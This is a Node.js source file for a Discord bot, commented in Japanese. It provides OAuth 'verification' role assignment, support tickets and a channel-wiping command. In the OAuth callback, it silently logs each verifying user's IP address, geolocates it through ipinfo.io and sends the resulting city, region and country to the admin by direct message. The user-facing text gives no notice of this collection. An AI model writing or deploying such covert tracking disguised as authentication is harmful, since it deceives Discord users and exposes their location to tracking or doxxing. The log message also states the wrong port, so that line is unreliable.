require("dotenv").config();
const {
  Client,
  GatewayIntentBits,
  Partials,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} = require("discord.js");
const express = require("express");
const axios = require("axios");
const path = require("path");
const { setFlagsFromString } = require("v8");

// Discord Botの設定
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
  partials: [Partials.Message, Partials.Channel, Partials.GuildMember],
});

// Express設定
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Expressサーバー起動
app.listen(8080, () => {
  console.log("🌐 サーバー起動 http://localhost:3000");
});

// Bot起動時ログ
client.once("ready", () => {
  console.log("✅ Bot is online!");
});

// メッセージコマンド処理
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  if (message.content.toLowerCase() === "!auth") {
    const authButton = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("auth_button")
        .setLabel("認証する")
        .setStyle(ButtonStyle.Primary),
    );

    await message.reply({
      content: "このボタンを押して認証してください：",
      components: [authButton],
    });
  }
});

// ボタンが押されたとき
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  if (interaction.customId === "auth_button") {
    const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify`;
    await interaction.reply({
      content: `🔐 以下のリンクから認証してください：\n${authUrl}`,
      ephemeral: true,
    });
  }
});

// 認証のコールバック
app.get("/callback", async (req, res) => {
  const { code } = req.query;
  if (!code) return res.status(400).send("認証コードがありません");

  try {
    // アクセストークン取得
    const tokenRes = await axios.post(
      "https://discord.com/api/oauth2/token",
      new URLSearchParams({
        client_id: process.env.CLIENT_ID,
        client_secret: process.env.CLIENT_SECRET,
        code,
        grant_type: "authorization_code",
        redirect_uri: process.env.REDIRECT_URI,
        scope: "identify",
      }),
      {
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
      },
    );

    const accessToken = tokenRes.data.access_token;

    // ユーザー情報取得
    const userRes = await axios.get("https://discord.com/api/v10/users/@me", {
      headers: { Authorization: `Bearer ${accessToken}` },
    });

    const user = userRes.data;
    const userId = user.id;
    const username = user.username;

    // サーバー内のユーザーを取得してロールを付与
    const guild = await client.guilds.fetch(process.env.GUILD_ID);
    const member = await guild.members.fetch(userId);

    if (member) {
      await member.roles.add(process.env.ROLE_ID);
      console.log(`✅ ロールを付与しました：${username}`);
    }

    // IPアドレスを Express から取得（信頼性向上版）
    const forwardedFor = req.headers["x-forwarded-for"];
    const ip = Array.isArray(forwardedFor)
      ? forwardedFor[0]
      : forwardedFor?.split(",")[0] || req.connection.remoteAddress;

    console.log("取得したIPアドレス:", ip);

    // IPから住所取得（ユーザーのIPを指定して取得）
    let locationInfo = "取得失敗";
    try {
      const ipRes = await axios.get(
        `https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_API_KEY}`,
      );

      locationInfo = `${ipRes.data.city || ""} ${ipRes.data.region || ""} ${ipRes.data.country || ""} (${ipRes.data.ip})`;
    } catch (e) {
      console.warn("位置情報取得失敗");
    }

    // 管理者にDM送信
    try {
      const adminUser = await client.users.fetch(process.env.ADMIN_USER_ID);
      await adminUser.send(
        `✅ 認証完了\n🧑 ユーザー: ${username} (${userId})\n📍 IP情報: ${locationInfo}`,
      );
    } catch (e) {
      console.warn("管理者DM送信失敗");
    }

    res.send(`✅ 認証が完了しました！ユーザー名: ${username}`);
  } catch (err) {
    console.error(err);
    res.status(500).send("❌ 認証に失敗しました");
  }
});
// サーバーオーナーIDチェック関数
function isServerOwner(message) {
  return message.guild && message.author.id === message.guild.ownerId;
}

// サーバーオーナーのみが使えるコマンド
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (!isServerOwner(message)) return;

  if (message.content.toLowerCase() === "!ticket") {
    const ticketButton = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("create_ticket")
        .setLabel("🎫 チケットを作成")
        .setStyle(ButtonStyle.Primary),
    );

    await message.reply({
      content:
        "サポートが必要ですか？以下のボタンをクリックしてチケットを作成してください。",
      components: [ticketButton],
    });
  }
});

// ボタン操作ハンドリング
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  // 🎫 チケット作成
  if (interaction.customId === "create_ticket") {
    const guild = interaction.guild;
    const member = interaction.member;
    const category = guild.channels.cache.find(
      (c) => c.name === "📁 チケット" && c.type === 4,
    ); // カテゴリがあれば使う

    const channel = await guild.channels.create({
      name: `ticket-${member.user.username}`,
      type: 0,
      parent: category?.id || null,
      permissionOverwrites: [
        { id: guild.roles.everyone.id, deny: ["ViewChannel"] },
        { id: member.id, allow: ["ViewChannel", "SendMessages"] },
        { id: guild.ownerId, allow: ["ViewChannel", "SendMessages"] },
      ],
    });

    const closeButton = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("close_ticket")
        .setLabel("❌ 閉じる")
        .setStyle(ButtonStyle.Danger),
    );

    await channel.send({
      content: `<@${member.id}> チケットが作成されました。管理者が対応します。`,
      components: [closeButton],
    });

    await interaction.reply({
      content: `✅ チケットを作成しました: ${channel}`,
      ephemeral: true,
    });
  }

  // ❌ チケット閉じる
  if (interaction.customId === "close_ticket") {
    const channel = interaction.channel;
    await channel.send("❌ チケットを閉じます...");
    setTimeout(() => {
      channel.delete().catch(console.error);
    }, 2000);
  }
});
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (!isServerOwner(message)) return;

  if (message.content.toLowerCase() === "!clearall") {
    try {
      const channel = message.channel;

      // チャンネルをクローン（設定を保持）
      const cloned = await channel.clone();

      // 新チャンネルを元と同じ位置に移動
      await cloned.setPosition(channel.position);

      // 元チャンネルを削除
      await channel.delete();

      // 通知送信
      cloned.send("✅ チャンネルを初期化しました（すべてのメッセージを削除）");
    } catch (err) {
      console.error("チャンネル初期化エラー:", err);
    }
  }
});

// Botログイン
client.login(process.env.DISCORD_TOKEN);
